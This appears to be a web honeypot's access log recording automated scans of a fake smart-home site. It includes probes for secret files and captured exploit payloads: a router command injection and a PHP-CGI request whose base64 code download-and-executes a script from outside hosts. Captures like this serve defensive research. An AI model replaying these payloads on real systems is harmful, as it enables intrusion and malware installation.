+2025-06-29 15:44:59 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:59 +0000] "GET /dashboard.html HTTP/1.1" 200 2913 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-29 15:44:59 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 15:44:59 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:59 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-29 15:44:59 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 15:44:59 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:59 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-29 15:44:59 INFO:snare.server:handle_request: Request path: /assets/images/logo.png
+2025-06-29 15:44:59 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:59 +0000] "GET /assets/images/logo.png HTTP/1.1" 200 427 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-29 15:45:00 INFO:snare.server:handle_request: Request path: /thermostat.html
+2025-06-29 15:45:01 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:45:00 +0000] "GET /thermostat.html HTTP/1.1" 200 5101 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-29 15:45:01 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 15:45:01 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:45:01 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-29 15:45:01 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 15:45:01 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:45:01 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-29 15:46:16 INFO:snare.server:handle_request: Request path: /
+2025-06-29 15:46:16 INFO:aiohttp.access:log: 79.11.172.201 [29/Jun/2025:15:46:16 +0000] "GET / HTTP/1.0" 200 2033 "-" "-"
+2025-06-29 15:46:16 INFO:snare.server:handle_request: Request path: /appliances.html
+2025-06-29 15:46:16 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:46:16 +0000] "GET /appliances.html HTTP/1.1" 200 6956 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-29 16:12:21 INFO:snare.server:handle_request: Request path: /
+2025-06-29 16:12:21 INFO:aiohttp.access:log: 204.76.203.212 [29/Jun/2025:16:12:21 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-29 16:36:00 INFO:snare.server:handle_request: Request path: /
+2025-06-29 16:36:00 INFO:aiohttp.access:log: 185.218.84.40 [29/Jun/2025:16:36:00 +0000] "GET / HTTP/1.1" 200 2033 "-" "-"
+2025-06-29 17:08:34 INFO:snare.server:handle_request: Request path: /.env
+2025-06-29 17:08:34 INFO:aiohttp.access:log: 78.153.140.149 [29/Jun/2025:17:08:34 +0000] "GET /.env HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+2025-06-29 17:08:34 INFO:snare.server:handle_request: Request path: /
+2025-06-29 17:08:34 INFO:snare.server:handle_request: POST data:
+2025-06-29 17:08:34 INFO:snare.server:handle_request: 	- 0x[]: androxgh0st
+2025-06-29 17:08:34 INFO:aiohttp.access:log: 78.153.140.149 [29/Jun/2025:17:08:34 +0000] "POST / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+2025-06-29 17:10:27 INFO:aiohttp.access:log: 45.131.155.254 [29/Jun/2025:17:10:27 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-29 17:10:40 INFO:aiohttp.access:log: 45.131.155.254 [29/Jun/2025:17:10:40 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-29 17:10:41 INFO:aiohttp.access:log: 45.131.155.254 [29/Jun/2025:17:10:41 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-29 17:10:42 INFO:snare.server:handle_request: Request path: /
+2025-06-29 17:10:42 INFO:aiohttp.access:log: 45.131.155.254 [29/Jun/2025:17:10:42 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
+2025-06-29 17:19:10 INFO:snare.server:handle_request: Request path: /.git/config
+2025-06-29 17:19:10 INFO:aiohttp.access:log: 139.59.165.24 [29/Jun/2025:17:19:10 +0000] "GET /.git/config HTTP/1.1" 404 433 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
+2025-06-29 17:19:10 INFO:snare.server:handle_request: Request path: /.env
+2025-06-29 17:19:10 INFO:aiohttp.access:log: 139.59.165.24 [29/Jun/2025:17:19:10 +0000] "GET /.env HTTP/1.1" 404 433 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
+2025-06-29 17:19:24 INFO:snare.server:handle_request: Request path: /cgi-bin/luci/;stok=/locale
+2025-06-29 17:19:24 INFO:aiohttp.access:log: 141.255.162.250 [29/Jun/2025:17:19:24 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 433 "-" "-"
+2025-06-29 17:19:50 INFO:snare.server:handle_request: Request path: /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://220.158.232.99/x/tplink+-O-|sh)
+2025-06-29 17:19:50 INFO:snare.server:handle_request: Request path: /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://220.158.232.99/x/tplink+-O-|sh)
+2025-06-29 17:19:51 INFO:aiohttp.access:log: 87.121.84.34 [29/Jun/2025:17:19:50 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://220.158.232.99/x/tplink+-O-|sh) HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
+2025-06-29 17:19:51 INFO:aiohttp.access:log: 87.121.84.34 [29/Jun/2025:17:19:50 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://220.158.232.99/x/tplink+-O-|sh) HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
+2025-06-29 17:20:37 INFO:snare.server:handle_request: Request path: /favicon.ico
+2025-06-29 17:20:37 INFO:aiohttp.access:log: 45.82.78.254 [29/Jun/2025:17:20:37 +0000] "GET /favicon.ico HTTP/1.1" 404 433 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
+2025-06-29 17:20:42 INFO:aiohttp.access:log: 185.242.226.115 [29/Jun/2025:17:20:42 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-29 17:26:46 INFO:snare.server:handle_request: Request path: /
+2025-06-29 17:26:46 INFO:aiohttp.access:log: 93.174.93.12 [29/Jun/2025:17:26:46 +0000] "GET / HTTP/1.0" 200 2033 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0"
+2025-06-29 17:51:44 INFO:snare.server:handle_request: Request path: /portal/redlion
+2025-06-29 17:51:44 INFO:aiohttp.access:log: 20.65.201.12 [29/Jun/2025:17:51:44 +0000] "GET /portal/redlion HTTP/1.1" 404 433 "-" "Mozilla/5.0 zgrab/0.x"
+2025-06-29 18:01:17 INFO:snare.server:handle_request: Request path: /actuator/gateway/routes
+2025-06-29 18:01:17 INFO:aiohttp.access:log: 79.124.58.198 [29/Jun/2025:18:01:17 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 452 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+2025-06-29 18:13:22 INFO:snare.server:handle_request: Request path: /
+2025-06-29 18:13:22 INFO:aiohttp.access:log: 108.165.153.6 [29/Jun/2025:18:13:22 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-29 18:22:38 INFO:snare.server:handle_request: Request path: /
+2025-06-29 18:22:38 INFO:aiohttp.access:log: 185.242.226.115 [29/Jun/2025:18:22:38 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
+2025-06-29 18:28:02 INFO:snare.server:handle_request: Request path: /
+2025-06-29 18:28:02 INFO:aiohttp.access:log: 185.218.84.178 [29/Jun/2025:18:28:02 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-29 18:35:07 INFO:snare.server:handle_request: Request path: /
+2025-06-29 18:35:07 INFO:aiohttp.access:log: 81.12.77.247 [29/Jun/2025:18:35:07 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+2025-06-29 18:50:06 INFO:aiohttp.access:log: 92.88.176.205 [29/Jun/2025:18:50:06 +0000] "UNKNOWN / HTTP/1.0" 400 201 "-" "-"
+2025-06-29 18:50:31 INFO:snare.server:handle_request: Request path: /.git/HEAD
+2025-06-29 18:50:31 INFO:aiohttp.access:log: 196.251.70.87 [29/Jun/2025:18:50:31 +0000] "GET /.git/HEAD HTTP/1.1" 404 452 "-" "Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0"
+2025-06-29 18:50:31 INFO:snare.server:handle_request: Request path: /
+2025-06-29 18:50:31 INFO:aiohttp.access:log: 204.76.203.206 [29/Jun/2025:18:50:31 +0000] "GET / HTTP/1.1" 200 2033 "-" "-"
+2025-06-29 18:56:35 INFO:snare.server:handle_request: Request path: /
+2025-06-29 18:56:35 INFO:aiohttp.access:log: 204.76.203.212 [29/Jun/2025:18:56:35 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-29 19:19:44 INFO:aiohttp.access:log: 79.124.58.198 [29/Jun/2025:19:19:44 +0000] "UNKNOWN / HTTP/1.0" 400 225 "-" "-"
+2025-06-29 19:28:24 INFO:snare.server:handle_request: Request path: /.env
+2025-06-29 19:28:24 INFO:aiohttp.access:log: 45.83.220.205 [29/Jun/2025:19:28:24 +0000] "GET /.env HTTP/1.1" 404 433 "-" "Python/3.11 aiohttp/3.12.13"
+2025-06-29 19:36:46 INFO:aiohttp.access:log: 104.248.139.208 [29/Jun/2025:19:36:46 +0000] "UNKNOWN / HTTP/1.0" 400 222 "-" "-"
+2025-06-29 19:38:27 INFO:snare.server:handle_request: Request path: /.git/index
+2025-06-29 19:38:27 INFO:aiohttp.access:log: 198.55.98.76 [29/Jun/2025:19:38:27 +0000] "GET /.git/index HTTP/1.1" 404 452 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
+2025-06-29 19:38:42 INFO:aiohttp.access:log: 198.235.24.101 [29/Jun/2025:19:38:42 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-29 19:38:43 INFO:aiohttp.access:log: 198.235.24.101 [29/Jun/2025:19:38:43 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-29 19:56:00 INFO:snare.server:handle_request: Request path: /
+2025-06-29 19:56:00 INFO:aiohttp.access:log: 87.121.84.212 [29/Jun/2025:19:56:00 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-29 20:14:54 INFO:aiohttp.access:log: 220.133.30.133 [29/Jun/2025:20:14:54 +0000] "UNKNOWN / HTTP/1.0" 400 201 "-" "-"
+2025-06-29 20:29:58 INFO:snare.server:handle_request: Request path: /manager/text/list
+2025-06-29 20:29:58 INFO:aiohttp.access:log: 74.249.178.154 [29/Jun/2025:20:29:58 +0000] "GET /manager/text/list HTTP/1.1" 404 433 "-" "Mozilla/5.0 zgrab/0.x"
+2025-06-29 20:47:41 INFO:snare.server:handle_request: Request path: /
+2025-06-29 20:47:41 INFO:aiohttp.access:log: 185.218.84.178 [29/Jun/2025:20:47:41 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-29 21:06:37 INFO:snare.server:handle_request: Request path: /
+2025-06-29 21:06:37 INFO:aiohttp.access:log: 108.165.153.7 [29/Jun/2025:21:06:37 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-29 21:17:52 INFO:snare.server:handle_request: Request path: /
+2025-06-29 21:17:52 INFO:aiohttp.access:log: 204.76.203.212 [29/Jun/2025:21:17:52 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-29 21:26:19 INFO:snare.server:handle_request: Request path: /.env
+2025-06-29 21:26:19 INFO:aiohttp.access:log: 78.153.140.149 [29/Jun/2025:21:26:19 +0000] "GET /.env HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+2025-06-29 21:26:20 INFO:snare.server:handle_request: Request path: /
+2025-06-29 21:26:20 INFO:snare.server:handle_request: POST data:
+2025-06-29 21:26:20 INFO:snare.server:handle_request: 	- 0x[]: androxgh0st
+2025-06-29 21:26:20 INFO:aiohttp.access:log: 78.153.140.149 [29/Jun/2025:21:26:20 +0000] "POST / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+2025-06-29 21:43:24 INFO:snare.server:handle_request: Request path: /.git/config
+2025-06-29 21:43:24 INFO:aiohttp.access:log: 139.59.185.200 [29/Jun/2025:21:43:24 +0000] "GET /.git/config HTTP/1.1" 404 433 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+2025-06-29 21:58:05 INFO:snare.server:handle_request: Request path: /.env
+2025-06-29 21:58:05 INFO:aiohttp.access:log: 78.153.140.149 [29/Jun/2025:21:58:05 +0000] "GET /.env HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+2025-06-29 21:58:05 INFO:snare.server:handle_request: Request path: /
+2025-06-29 21:58:05 INFO:snare.server:handle_request: POST data:
+2025-06-29 21:58:05 INFO:snare.server:handle_request: 	- 0x[]: androxgh0st
+2025-06-29 21:58:05 INFO:aiohttp.access:log: 78.153.140.149 [29/Jun/2025:21:58:05 +0000] "POST / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+2025-06-29 21:58:57 INFO:snare.server:handle_request: Request path: /developmentserver/metadatauploader
+2025-06-29 21:58:57 INFO:aiohttp.access:log: 135.237.126.148 [29/Jun/2025:21:58:57 +0000] "GET /developmentserver/metadatauploader HTTP/1.1" 404 433 "-" "Mozilla/5.0 zgrab/0.x"
+2025-06-29 22:03:14 INFO:snare.server:handle_request: Request path: /
+2025-06-29 22:03:14 INFO:aiohttp.access:log: 34.79.92.92 [29/Jun/2025:22:03:14 +0000] "GET / HTTP/1.1" 200 2033 "-" "python-requests/2.32.4"
+2025-06-29 22:04:14 INFO:snare.server:handle_request: Request path: /
+2025-06-29 22:04:14 INFO:aiohttp.access:log: 108.165.153.6 [29/Jun/2025:22:04:14 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-29 22:20:34 INFO:snare.server:handle_request: Request path: /
+2025-06-29 22:20:34 INFO:aiohttp.access:log: 185.218.84.178 [29/Jun/2025:22:20:34 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-29 22:35:01 INFO:snare.server:handle_request: Request path: /
+2025-06-29 22:35:01 INFO:aiohttp.access:log: 185.218.84.47 [29/Jun/2025:22:35:01 +0000] "GET / HTTP/1.1" 200 2033 "-" "-"
+2025-06-29 22:57:50 INFO:snare.server:handle_request: Request path: /
+2025-06-29 22:57:50 INFO:aiohttp.access:log: 108.165.153.7 [29/Jun/2025:22:57:50 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-29 23:04:27 INFO:aiohttp.access:log: 141.76.94.18 [29/Jun/2025:23:04:27 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-29 23:04:35 INFO:aiohttp.access:log: 141.76.94.18 [29/Jun/2025:23:04:35 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-29 23:04:42 INFO:snare.server:handle_request: Request path: /pscan
+2025-06-29 23:04:42 INFO:aiohttp.access:log: 141.76.94.18 [29/Jun/2025:23:04:42 +0000] "GET /pscan HTTP/1.1" 404 452 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+2025-06-29 23:04:51 INFO:aiohttp.access:log: 141.76.94.18 [29/Jun/2025:23:04:51 +0000] "CONNECT  HTTP/1.1" 200 424 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+2025-06-29 23:04:55 INFO:aiohttp.access:log: 141.76.94.18 [29/Jun/2025:23:04:55 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-29 23:20:38 INFO:snare.server:handle_request: Request path: /
+2025-06-29 23:20:38 INFO:aiohttp.access:log: 118.194.251.75 [29/Jun/2025:23:20:38 +0000] "GET / HTTP/1.1" 200 2033 "-" "curl/7.29.0"
+2025-06-29 23:20:38 INFO:aiohttp.access:log: 118.194.251.75 [29/Jun/2025:23:20:38 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-29 23:20:39 INFO:aiohttp.access:log: 118.194.251.75 [29/Jun/2025:23:20:39 +0000] "UNKNOWN / HTTP/1.0" 400 230 "-" "-"
+2025-06-29 23:21:18 INFO:snare.server:handle_request: Request path: /
+2025-06-29 23:21:18 INFO:aiohttp.access:log: 152.32.129.154 [29/Jun/2025:23:21:18 +0000] "GET / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 9_1) AppleWebKit/536.44 (KHTML, like Gecko) Chrome/77.0.993 Safari/537.36"
+2025-06-29 23:21:19 INFO:snare.server:handle_request: Request path: /favicon.ico
+2025-06-29 23:21:19 INFO:aiohttp.access:log: 152.32.129.154 [29/Jun/2025:23:21:19 +0000] "GET /favicon.ico HTTP/1.1" 404 452 "-" "Go-http-client/1.1"
+2025-06-29 23:21:19 INFO:snare.server:handle_request: Request path: /assets/js/auth.js
+2025-06-29 23:21:19 INFO:aiohttp.access:log: 152.32.129.154 [29/Jun/2025:23:21:19 +0000] "GET /assets/js/auth.js HTTP/1.1" 200 418 "-" "Go-http-client/1.1"
+2025-06-29 23:21:20 INFO:snare.server:handle_request: Request path: /sitemap.xml
+2025-06-29 23:21:20 INFO:snare.server:handle_request: Request path: /robots.txt
+2025-06-29 23:21:20 INFO:aiohttp.access:log: 152.32.129.154 [29/Jun/2025:23:21:20 +0000] "GET /sitemap.xml HTTP/1.1" 404 452 "-" "Go-http-client/1.1"
+2025-06-29 23:21:20 INFO:aiohttp.access:log: 152.32.129.154 [29/Jun/2025:23:21:20 +0000] "GET /robots.txt HTTP/1.1" 404 452 "-" "Go-http-client/1.1"
+2025-06-29 23:39:53 INFO:snare.server:handle_request: Request path: /
+2025-06-29 23:39:53 INFO:aiohttp.access:log: 204.76.203.212 [29/Jun/2025:23:39:53 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-29 23:40:51 INFO:snare.server:handle_request: Request path: /cgi-bin/luci/;stok=/locale
+2025-06-29 23:40:51 INFO:aiohttp.access:log: 141.255.162.250 [29/Jun/2025:23:40:51 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 433 "-" "-"
+2025-06-29 23:57:01 INFO:snare.server:handle_request: Request path: /
+2025-06-29 23:57:01 INFO:aiohttp.access:log: 20.175.118.8 [29/Jun/2025:23:57:01 +0000] "GET / HTTP/1.0" 200 2033 "-" "-"
+2025-06-29 23:59:48 INFO:aiohttp.access:log: 80.82.77.202 [29/Jun/2025:23:59:48 +0000] "UNKNOWN / HTTP/1.0" 400 222 "-" "-"
+2025-06-30 00:00:24 INFO:snare.server:handle_request: Request path: /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
+2025-06-30 00:00:24 INFO:snare.server:handle_request: POST data:
+2025-06-30 00:00:24 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:24 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:24 INFO:snare.server:handle_request: Request path: /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
+2025-06-30 00:00:24 INFO:snare.server:handle_request: POST data:
+2025-06-30 00:00:24 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:24 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:24 INFO:snare.server:handle_request: Request path: /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+2025-06-30 00:00:24 INFO:snare.server:handle_request: POST data:
+2025-06-30 00:00:24 INFO:snare.server:handle_request: 	- <?php shell_exec(base64_decode("WD0kKGN1cmwgaHR0cDovLzY2LjYzLjE4Ny4xOTMvc2ggfHwgd2dldCBodHRwOi8vNjYuNjMuMTg3LjE5My9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA: ")); echo(md5("Hello CVE-2024-4577")); ?>
+2025-06-30 00:00:24 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:24 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:24 INFO:snare.server:handle_request: Request path: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:24 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:24 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:25 INFO:snare.server:handle_request: Request path: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
+2025-06-30 00:00:25 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:25 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:26 INFO:snare.server:handle_request: Request path: /vendor/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:26 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:26 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:28 INFO:snare.server:handle_request: Request path: /vendor/phpunit/Util/PHP/eval-stdin.php
+2025-06-30 00:00:28 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:28 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:28 INFO:snare.server:handle_request: Request path: /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
+2025-06-30 00:00:28 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:28 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:29 INFO:snare.server:handle_request: Request path: /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:29 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:29 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:29 INFO:snare.server:handle_request: Request path: /phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:29 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:29 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:30 INFO:snare.server:handle_request: Request path: /phpunit/phpunit/Util/PHP/eval-stdin.php
+2025-06-30 00:00:30 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:30 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
